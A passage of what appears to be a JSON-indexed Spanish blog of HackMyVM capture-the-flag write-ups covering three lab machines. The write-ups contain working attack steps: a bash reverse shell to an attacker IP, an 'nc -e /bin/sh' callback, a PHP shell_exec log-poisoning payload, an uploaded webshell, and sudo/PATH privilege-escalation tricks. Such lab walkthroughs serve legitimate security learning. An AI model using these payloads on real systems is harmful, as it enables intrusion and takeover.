    "content": "En esta maquina en teoría sencilla nos encontramos los siguientes  retos y complicaciones  Averiguar ip victima.  Enumeracion  Remote code execution  Escalada de privelegiosHerramientes usadas:  arp-scan  nmap  wfuzz , dirbuster ,wfuzz  ssh  sudoLo primero como siempre averiguar la ip de la victima para ello ejecutamos\tarp-scan --localnetUna vez tenemos clara la ip  lanzamos nmap .\tnmap -T4 -sCSV -p- 192.168.0.104Como podemos observar nos muestra el puerto 22 y el 80 abierto.Es momento de investigar manualmente la pagina que corre en el servidor http , para ganar algo de tiempo mientras revisamos la web lanzamos dirb y gobuster que son dos programas para fuzzing.\tgobuster -q dir -w /usr/share/dirbuster/directory-list-2.3-small.txt -x html,htm,php,txt,xml -u http://192.168.0.104 --exclude-length 3690Lo primero que nos encontramos es el index por defecto del servidor nginx , no hay nada en el codigo de ese .htmlObservamos los resultados tanto de dirb como gobuster e investigamos los links que nos a proporcionado.Responden a las siguientes rutas.  index.htm  sitemap.xml  note.txt  secret.phpEl index htm nos lleva a una web con una imagen , observando el codigo fuente vemos que nos muestra la misma ruta que nos dio gobuster /secret.php.El sitemap.xml nos indica una ruta que no existe.El txt nos indica que el secreto de esta maquina esta en la enumeración.Y por ultimo la ruta hacia secret.php nos redirecciona a una imagen externa (Un cahondo el tipo que creo el reto, nos dice que usemos el cerebro )En el codigo de index.htm vemos que hay un form escondido debemos de inetentar llegar a el , construimos la url con los datos que aparecen en el form .\thttp://192.168.0.104/secret.php?HackMyVMComo podemos observar es el sitio correcto pero la manera incorrecta pues nos dice que probemos otro método , lo único que se me ocurre es como se tramita la petición de esa web , las partes visibles son GET y las ocultas POST  por resumirlo de esta manera burda y probablemente poco acertada.Después de una par de horas investigando y buscando la forma de poder modificar la petición me instalo la extensión de firefox http request maker.  Se debe de poder hacer con curl , burpsuite e imagino que wgetEl unico fichero que nos falta por revisar el codigo es secret.php asi que vamos ello .Como vemos es un script que lo que hace es que cuando la solicitud no va por post nos redirecciona a otro lugar y cuando la realizas por post y y usas HackMyVM te prensenta la posibilidad de ejecutar comandos.Yo pensaba en una revshell pero al final del todo encontramos  un user y una pass , recordemos que el 22 esta abierto y sin mas vamos a probar.Entramos con ese user y passAhora como siempre lo primero sudo y luego find buscando permisos setiud.Con sudo -l tenemos suerte nos vamos como siempre a gtfobins y buscamos “ip” seguimos los pasos del punto b que son los que a mi me han funcionado y nos olvidamos de find.En el momento que ejecutamos los dos comandos nos convertimos en root.  Estos ultimos comandos no se que hacian y decidi que me lo explicara la puta IA.      sudo ip netns add foo: Este comando crea un nuevo espacio de nombres de red llamado “foo”. Los espacios de nombres de red proporcionan entornos de red aislados, lo que significa que los procesos que se ejecutan en un espacio de nombres de red no pueden ver ni comunicarse con los procesos que se ejecutan en otros espacios de nombres de red.    sudo ip netfs exec foo /bin/sh :Este ejcuta bin sh dentro del espacio de red foo , lo cual hace que nos lancemos una shell de root.  Muchas gracias por leer. Acabe tan harto de leer sobre las peticiones que al final no me acorde de la flag de root ."
  },
  
  {
    "title": "Friendly, HACKMYVM",
    "url": "/posts/friendly/",
    "categories": "",
    "tags": "",
    "date": "2023-11-16 00:00:00 -0300",
    





    
    "snippet": "En este reto nos encontramos con escaneo , configuracion erronea en uno de sus servicios y escalado de privilegios con binario.Este es el primer reto que consiguo hacer solo consultando la web de g...",
    "content": "En este reto nos encontramos con escaneo , configuracion erronea en uno de sus servicios y escalado de privilegios con binario.Este es el primer reto que consiguo hacer solo consultando la web de gotfbins para saber para aprender como usar el binario.Herramientas y recursos web utilizados  arp-scan  nmap  gotfbinsEscaneoEmpezamos averiguando la ip de la maquina victima para ello ejecutamos la herramienta arp-scan nos fijamos en el resultado y buscamos la mac que empieza por 08:00 esa mac es de virtualbox.Ejecutamos:sudo arp-scan --localnetUna vez obtenida la ip pasamos al escanear puertosnmap -sC -sV -A -p- --min-rate 5000 $ipIntrusionVemos que tiene el 21 y el 80 abierto en el 21 tenemos login anonynous y nos permite subir ficheros.Nos subimos un webshell al servidor que podemos encontrar en github.Creamos un archivo .html con el siguiente contenido , lo subimos y posteriormente lo ejecutamos a traves del webshell que subimos#!/bin/bash bash -i &gt;&amp; /dev/tcp/192.168.0.112/443 0&gt;&amp;1Antes de ejecutar desde el webshell el archivo que subimos debemos ponernos con netcat a la escucha.nc -lnvp 443EscaladaUna vez con la tty en nuestra maquina atacante buscamos binarios por con permisos para ello probamos primero un :sudo -lEl binario que nos muestra nos sirve para la escalada de privilegiospodemos vistar gtofbins para consultaAhora ejecutamos vim como se indica gotfbins.sudo vim -c ':!/bin/sh'Obtendremos automaticamente rootSi os interesan las flags no os olvideis de buscarlas .Gracias por leer este reto."
  },
  
  {
    "title": "Drifting Blues 3 , HACKMYVM",
    "url": "/posts/driftingblues3/",
    "categories": "",
    "tags": "",
    "date": "2023-11-16 00:00:00 -0300",
    





    
    "snippet": "En este reto nos encontramos escaneo , decodificacion de bas64 , log poisoning y  abuso del $PATH.No es un reto extremadamente dificil en el aprendemos como usar el path para escalar privilegios y ...",
    "content": "En este reto nos encontramos escaneo , decodificacion de bas64 , log poisoning y  abuso del $PATH.No es un reto extremadamente dificil en el aprendemos como usar el path para escalar privilegios y comprobaremos lo delicado que es mostrar logs a traves de un usario.Herramientas y recursos web utilizados  arp-scan  nmap  urlencoder  https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/EscaneoEmpezamos averiguando la ip de la maquina victima para ello ejecutamos la herramienta arp-scan nos fijamos en el resultado y buscamos la mac que empieza por 08:00 esa mac es de virtualbox.Ejecutamos:sudo arp-scan --localnetUna vez obtenida la ip pasamos al escanear puertosnmap -A -n -p- ipvictimaVemos que nos muestra el 22 y el 80 y en el 80 ya nos muestra una ruta /eventeadmins que debe de extraerla del fichero robots.txt todo esto lo puedes ver por firefox directamente.Revisamos la pagina y del texto podemos ver dos nombre de posibles usuarios uno john y el otro es buddyG , tambien nos dice que cheqeemos /littlequeenofspades.htmlRevisamos la pagina y a simple vista a mi no me dice nada , pero revisando su codigo encuentro un cifrado en base64  nos copiamos el churro y procedemos a decodificarlo.El resultado de la primera decodificacion nos da otro codigo base64 , decodificamos los dos y nos da una ruta.Vamos a la ruta que nos proporciono el codigo adminsfixit.php y vemos que es es el auth log ssh.Log poisoningSi intentamos login con cualuier usuario vemos que aparece reflejado en el log al refrescar la pagina.Ahora es el momento de intentar envenenar el log para nuestro beneficio subiendo una carga util que nos permita ejecutar codigo de manera remota “RCE”ssh &lt;?php echo shell_exec($_GET['cmd']); ?&gt;@ipvictimaSi ha funcionado deberiamos de poder ejuctar codigo con la siguiente ruta:  http://$ipvictima/adminsfixit.php?cmd=lsPara que los resultados sean mas visibles podemos visualizar la pagina por su codigo fuente.Desde mi punto de vista ya conseguimos lo mas complicado , ahora lo mejor en mandarnos una reverse shell , para ello ejecutamos tanto en nuestro equipo como en la victima netcat.Primero ponemos a la escucha la maquina atacante con :nc -lnvp 80 Y en la victima si fuera necesario podemos encodear la url  para ello vamos a urlencoder.orghttp://$ipvictima/adminsfixit.php?cmd=nc%20-e%20%2Fbin%2Fsh%20192.168.0.112%2080Ya tenemos la shell en nuestra maquina ahora toca hacerla interactivapython3 -c 'import pty; pty.spawn(\"/bin/sh\")'Escalada de privilegiosEncontramos un usario en home robertj el cual tiene el fichero user.txt el cual no podemos leer por permisos pues aun somos el usario  www-data.Vamos a probar a crear las claves  ssh para poder conectarnos por ssh con ese usario antes deberiamos comprobar la config de sshd para ver si el usuario tiene el authorized keys activado si no esta olvidemos esta escalada.Podemos crearlas en cualquier lugar pero mejor nos posicionamos en el directio .ssh de su home asi no la movemos despuesssh-keygen -f robertjUna vez creadas copiamos la clave publica a authorized_keys dentro de .ssh “obvio” y nos copiamos la privada a nuestra maquina atacante.cp clavepublica authorized_keysProbamos a conectar por sshssh -i robertj robertj@192.168.0.102Si lo hacemos tal y como se crearon las claves y copiamos a mi no me funciono hay que modificar los permisos y ponerlos solo de lectura para el propietario chmod 400 robertjVolvemos a ejecutar ahora nos pide la contraseña que dimos cuando crearmos las clavesUna vez dentro cat al user.txt para obtener la flag  413f****“*Una vez como el usuario comprobamos si hay algun binario que pueda ejecutar como root con sudo y tambien binarios con suidsudo -lfind /  -perm /4000El binario en cuestion es getinfo y nos vamos a aprovechar  y alterar el path.getinfo hace uso de cat , asi que nos creammos un fichero de nombre cat con el contenido /bin/bash y añadimos la ruta donde tengamos nuestro cat trucado a nuestro pathecho /bin/bash &gt; catLe damos permisos de ejucion para todos.chmod 777 catAñadimos nuestra ruta al pathexport  PATH=/tmp:$PATH En el comando anterior veis en directorio que he usado para crear el cat malicioso , comprobamos que nuestro directorio este en el PATH.echo $PATHAhora estamos listos para ejecutar getinfo ni bien se ejecute deberia leer nuestro cat trucado y hacernos root al toqueAcordaros de la flag si os interesa , gracias por leer mis apuntes."
  }
  
]

